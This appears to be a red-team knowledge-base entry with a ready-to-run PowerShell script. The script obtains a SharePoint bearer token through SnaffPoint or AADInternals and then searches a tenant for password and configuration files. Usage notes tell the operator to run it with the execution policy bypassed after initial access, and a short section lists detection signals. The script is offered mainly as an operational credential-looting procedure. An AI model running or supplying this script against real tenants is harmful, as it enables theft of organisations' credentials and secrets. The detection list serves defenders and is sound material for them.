---
id: 79461f18-7f5e-42f9-a7a6-17dbb0639299
name: sharepoint-password-looting-script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:28.947699+00:00'
updated_at: '2023-10-10T20:37:31.891619+00:00'
platforms:
  - Windows
tags:
  - looting
  - sharepoint
  - powershell
validated: true
---

# sharepoint-password-looting-script

## Code

```powershell
# First, retrieve a token
## Method 1: using SnaffPoint binary
$token = (.\GetBearerToken.exe https://your.sharepoint.com)
## Method 2: using AADInternals
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")

# Second, search on Sharepoint
## Method 1: using search strings in ./presets dir
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
## Method 2: using search string in command line
### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
```

## Description

This PowerShell script automates the process of retrieving an authentication token for SharePoint and performing loot searches using SnaffPoint. It provides two token methods and two search approaches, allowing flexible credential discovery in Microsoft 365 environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| https://your.sharepoint.com | Target SharePoint site URL | https://contoso.sharepoint.com |
| your.onmicrosoft.com | Azure AD tenant ID | contoso.onmicrosoft.com |
| 9bc3ab49-b65d-410a-85ad-de819febfddc | Fixed SharePoint client ID | (Do not change) |
| filename:.config | FQL search query | *password* OR filename:ini |

## Usage

Save as .ps1 and execute in PowerShell with Bypass policy: powershell -ep Bypass -f script.ps1. Use after gaining initial access; token methods prompt for creds. Searches output loot to console; pipe to file for review. Ideal for red team ops targeting password files in shares.

## Detection

- PowerShell module installs (AADInternals) in event logs.
- Execution of unsigned exes like GetBearerToken.exe via Sysmon.
- API calls to SharePoint with unusual queries in Azure AD logs.
- Network traffic to sharepoint.com from non-browser processes.

## Related

- [[procedures/Password-Looting-from-SharePoint-and-SMB-Shares]]
- [[tools/SnaffPoint]]
- [[tools/AADInternals]]
